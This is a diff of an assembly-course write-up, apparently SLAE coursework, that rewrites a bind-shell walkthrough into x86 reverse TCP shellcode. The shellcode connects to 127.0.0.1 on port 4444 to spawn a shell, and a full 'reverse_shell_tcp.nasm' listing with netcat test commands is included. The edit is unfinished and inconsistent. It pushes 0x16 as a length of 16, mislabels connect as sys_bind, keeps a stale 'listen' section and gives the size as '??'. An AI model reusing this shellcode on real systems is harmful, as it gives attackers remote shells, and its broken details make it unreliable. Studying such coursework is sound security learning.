@@ -148,16 +148,12 @@ osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/linux/net.h
 #define SYS_CONNECT	3		/* sys_connect(2)		*/
 ```
 
-Using the C code as a reference and template for the Assembly code, the memory registers are initialized and cleared by performing an XOR operation against themselves (sets their values to '0'), and the frame pointer set:
+Using the C code as a reference and template for the Assembly code, the memory registers are initialized and cleared by performing an XOR operation against themselves (sets their values to '0'):
 
 ```nasm
-	; set the frame pointer
-	mov ebp, esp
-
 	; initialize registers
 	xor eax, eax
-	xor ecx, ecx
-	xor edx, edx
+	xor ebx, ebx
 ```
 
 #### 1st Syscall (Create Socket)
@@ -184,65 +180,54 @@ The last argument value for int protocol is going to be ‘0’ to accept any pr
 
 ```nasm
         ; push socket values onto the stack
-        push esi         ; push 0 onto the stack, default protocol
-        push 0x1         ; push 1 onto the stack, SOCK_STREAM
-        push 0x2         ; push 2 onto the stack, AF_INET
+        push eax	; push 0 onto the stack, default protocol		
+        push 0x1        ; push 1 onto the stack, SOCK_STREAM
+        push 0x2        ; push 2 onto the stack, AF_INET
 ```
 
 The newly created socket can be identified by storing the value of EAX into the EDX register as reference for a later stage (with the ability to use EAX in subsequent system calls):
 
 ```nasm
-	mov edx, eax   	 ; save the return value
+	mov edx, eax	; save the return value
 ```
 
 1st Syscall (Assembly code section):
 
 ```nasm
-        ; 1st syscall - create socket (sockaddr_in struct)
-	push eax
-	push eax 	 ; 8 bytes of padding
-	mov eax, 0xffffffff ; XOR IP address with this hex value (avoid NULL's contained in IP)
-	mov ebx, 0xfeffff80 ; hex value of 127.0.0.1 XOR'd with 0xffffffff
-	xor ebx, eax
-	push ebx         ; IP address 127.0.0.1 is set
-	push word 0x5c11 ; port 4444 is set
-	push word 0x02   ; AF_INET
-	; call socket(domain, type, protocol)
-	xor eax, eax
-	xor ebx, ebx
-	mov ax, 0x66    ; hex value of 102
-	mov bl, 0x02     ; AF_INET
-	mov cl, 0x01     ; SOCK_STREAM
-	int 0x80	 ; call the interrupt to create the socket, execute the syscall		
-	mov ebx, eax     ; socket file descriptor
+	; 1st syscall - create socket (sockaddr_in struct)	
+        mov al, 0x66	; hex value for socket
+        mov bl, 0x1     ; socket
+        mov ecx, esp    ; pointer to the arguments pushed
+        int 0x80        ; call the interrupt to create the socket, execute the syscall
+        mov edx, eax    ; save the return value 
 ```
 
-#### 2nd Syscall (Bind Socket to IP/Port in Sockaddr Struct)
+#### 2nd Syscall (Connect Socket to IP/Port in Sockaddr Struct)
 -----
 
-The definition of the bind syscall function in the man pages describes the arguments required:
+The connect syscall in the Reverse TCP shell essentially encompasses the bind, accept, and listen syscalls in the Bind TCP shell from Assignment 1.
+
+The definition of the connect syscall function in the man pages describes the arguments required:
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE$ man bind
+osboxes@osboxes:~/Downloads/SLAE$ man connect
 
-BIND(2)                                Linux Programmer's Manual                               BIND(2)
+CONNECT(2)                                 Linux Programmer's Manual                                CONNECT(2)
 
 NAME
-       bind - bind a name to a socket
+       connect - initiate a connection on a socket
 
 SYNOPSIS
        #include <sys/types.h>          /* See NOTES */
        #include <sys/socket.h>
 
-       int bind(int sockfd, const struct sockaddr *addr,
-                socklen_t addrlen);
+       int connect(int sockfd, const struct sockaddr *addr,
+                   socklen_t addrlen);
 
 DESCRIPTION
-       When  a socket is created with socket(2), it exists in a name space (address family) but has no
-       address assigned to it.  bind() assigns the address specified to by addr to the socket referred
-       to  by the file descriptor sockfd.  addrlen specifies the size, in bytes, of the address struc-
-       ture pointed to by addr.  Traditionally, this operation  is  called  "assigning  a  name  to  a
-       socket".
+       The  connect() system call connects the socket referred to by the file descriptor sockfd to the address
+       specified by addr.  The addrlen argument specifies the size of addr.  The format of the address in addr
+       is determined by the address space of the socket sockfd; see socket(2) for further details.
 ```
 
 The 3 arguments required:
@@ -251,7 +236,7 @@ The 3 arguments required:
 * const struct sockaddr *addr -> A pointer to the location on the stack of the sockaddr struct to be created
 * socklen_t addrlen -> The length of an IP socket address is 16  
 
-The structure for handling internet addresses can be viewed via the man pages for the header file:
+The structure for handling internet addresses can be viewed via the man pages in the header file:
 
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/netinet/in.h
@@ -273,7 +258,9 @@ struct sockaddr_in {
 
 Since the stack grows from High to Low memory it is important to remember to place these arguments onto the stack in reverse order.
 
-The Internet address will be set to 0.0.0.0 (opens bind port to all interfaces), and pushed onto the stack with the value of ECX and EDX.
+The Internet address will be set to 127.0.0.1 (listening machine), the value 0xffffffff is moved into EDI.
+
+The XOR'd value of 127.0.0.1 (0xfeffff80) is then pushed onto the stack in reverse order.
 
 The chosen port number will need to be converted from decimal 4444 to hex 115C, which equates to 0x5c11 in Little Endian format.
 
@@ -286,13 +273,16 @@ The ESP stack pointer (top of the stack) is moved into the ECX register to store
 The value of 16 (struct sockaddr) is pushed onto the stack, along with the zeros which equate to the IP address:
 
 ```nasm
-	push esi        ; push 0 for bind address 0.0.0.0
-        push word 0x5c11; bind port 4444 is set
-        push word 0x2   ; AF_INET
-        mov ecx, esp    ; move esp into ecx, store the const struct sockaddr *addr argument
-        push 0x16       ; length of sockaddr struct, 16
-        push ecx        ; push all zeros on the stack, equals IP parameter of 0.0.0.0
-        push edx        ; push all zeros on the stack, equals IP parameter of 0.0.0.0
+	mov edi, 0xffffffff; XOR IP address with this hex value (avoid NULL's contained in IP)
+        xor edi, 0xfeffff80; hex value of 127.0.0.1 XOR'd with 0xffffffff
+        push edi	; push XOR'd value on the stack
+        push word 0x5c11; port 4444 is set
+        ;inc ebx         ; ebx is increased with 1 from 0x1
+        push word 0x2   ; AF_INET = 2
+        mov ecx, esp    ; pointer to the arguments
+        push 0x16	; length of sockaddr struct, 16
+        push ecx        ; push pointer to sockaddr
+        push edx        ; push pointer to sockfd
 ```    
     
 The next instruction set moves the hex value for the socket function into the lower half of EAX, which is required for the bind syscall:
@@ -304,26 +294,30 @@ The next instruction set moves the hex value for the socket function into the lo
 Followed by an instruction to call the interrupt to execute the bind syscall: 
 
 ```nasm
-    	mov bl, 2       ; sys_bind = 2
+    	mov bl, 3       ; sys_bind = 3
         mov ecx, esp    ; pointer to the arguments
-        int 0x80        ; call the interrupt to execute the bind syscall
+        int 0x80        ; call the interrupt to execute the connect syscall
 ```
 
 2nd Syscall (Assembly code section):
 
 ```nasm
-	; 2nd syscall - bind socket to IP/Port in sockaddr struct
-        push esi        ; push 0 for bind address 0.0.0.0
-        push word 0x5c11; bind port 4444 is set
-        push word 0x2   ; AF_INET
-        mov ecx, esp    ; move esp into ecx, store the const struct sockaddr *addr argument
-        push 0x16       ; length of sockaddr struct, 16
-        push ecx        ; push all zeros on the stack, equals IP parameter of 0.0.0.0
-        push edx        ; push all zeros on the stack, equals IP parameter of 0.0.0.0
-        mov al, 0x66    ; hex value for socket
-        mov bl, 2       ; sys_bind = 2
+	; 2nd syscall - connect socket to IP/Port in sockaddr struct
+	mov edi, 0xffffffff; XOR IP address with this hex value (avoid NULL's contained in IP)
+        xor edi, 0xfeffff80; hex value of 127.0.0.1 XOR'd with 0xffffffff
+        push edi	; push XOR'd value on the stack
+        push word 0x5c11; port 4444 is set
+        ;inc ebx         ; ebx is increased with 1 from 0x1
+        push word 0x2   ; AF_INET = 2
         mov ecx, esp    ; pointer to the arguments
-        int 0x80        ; call the interrupt to execute the bind syscall
+        push 0x16	; length of sockaddr struct, 16
+        push ecx        ; push pointer to sockaddr
+        push edx        ; push pointer to sockfd
+        mov al, 0x66    ; hex value for socket
+	mov bl, 3 	; sys_connect = 3
+	mov ecx, esp    ; pointer to the arguments
+        ;inc ebx         ; sys_connect = 3
+        int 0x80        ; call the interrupt to execute the connect syscall
 ```
 
 #### 3rd Syscall (Listen for incoming connections)
@@ -619,13 +613,13 @@ Finally, the execve syscall and the program interrupt are called to execute the 
 -------------
 
 ````nasm
-; Filename: shell_bind_tcp.nasm
+; Filename: reverse_shell_tcp.nasm
 ; Author: h3ll0clar1c3
-; Purpose: Bbind shellcode on TCP port 4444, spawn a shell on incoming connection
-; Compilation: ./compile.sh shell_bind_tcp
-; Usage: ./shell_bind_tcp
-; Testing: nc -nv 127.0.0.1 4444
-; Shellcode size: 105 bytes
+; Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 4444, spawn a shell on incoming connection
+; Compilation: ./compile.sh reverse_shell_tcp
+; Usage: ./reverse_shell_tcp
+; Testing: nc -lv 4444
+; Shellcode size: ?? bytes
 ; Architecture: x86
 
 global   _start
@@ -633,35 +627,38 @@ global   _start
 section .text
         _start:
 
-        ; initialize registers
-        xor eax, eax
-        xor ebx, ebx
-        xor esi, esi
+	; initialize registers
+	xor eax, eax
+	xor ebx, ebx
 
         ; push socket values onto the stack
-        push esi        ; push 0 onto the stack, default protocol
+        push eax	; push 0 onto the stack, default protocol		
         push 0x1        ; push 1 onto the stack, SOCK_STREAM
         push 0x2        ; push 2 onto the stack, AF_INET
 	
-        ; 1st syscall - create socket
-        mov al, 0x66    ; hex value for socket
-        mov bl, 0x1     ; socket
-        mov ecx, esp    ; pointer to the arguments pushed
-        int 0x80        ; call the interrupt to create the socket, execute the syscall
-        mov edx, eax    ; save the return value
+        ; 1st syscall - create socket (sockaddr_in struct)	
+        mov al, 0x66            ; hex value for socket
+        mov bl, 0x1             ; socket
+        mov ecx, esp            ; pointer to the arguments pushed
+        int 0x80                ; call the interrupt to create the socket, execute the syscall
+        mov edx, eax            ; save the return value 
 
-        ; 2nd syscall - bind socket to IP/Port in sockaddr struct
-        push esi        ; push 0 for bind address 0.0.0.0
-        push word 0x5c11; bind port 4444 is set
-        push word 0x2   ; AF_INET
-        mov ecx, esp    ; move esp into ecx, store the const struct sockaddr *addr argument
-        push 0x16       ; length of sockaddr struct, 16
-        push ecx        ; push all zeros on the stack, equals IP parameter of 0.0.0.0
-        push edx        ; push all zeros on the stack, equals IP parameter of 0.0.0.0
-        mov al, 0x66    ; hex value for socket
-        mov bl, 2       ; sys_bind = 2
+        ; 2nd syscall - connect socket to IP/Port in sockaddr struct
+	mov edi, 0xffffffff; XOR IP address with this hex value (avoid NULL's contained in IP)
+        xor edi, 0xfeffff80; hex value of 127.0.0.1 XOR'd with 0xffffffff
+        push edi	; push XOR'd value on the stack
+        push word 0x5c11; port 4444 is set
+        ;inc ebx         ; ebx is increased with 1 from 0x1
+        push word 0x2   ; AF_INET = 2
         mov ecx, esp    ; pointer to the arguments
-        int 0x80        ; call the interrupt to execute the bind syscall
+        push 0x16	; length of sockaddr struct, 16
+        push ecx        ; push pointer to sockaddr
+        push edx        ; push pointer to sockfd
+        mov al, 0x66    ; hex value for socket
+	mov bl, 3 	; sys_connect = 3
+	mov ecx, esp    ; pointer to the arguments
+        ;inc ebx         ; sys_connect = 3
+        int 0x80        ; call the interrupt to execute the connect syscall
 
         ; 3rd syscall - listen for incoming connections
         push byte 0x1   ; listen for 1 client at a time
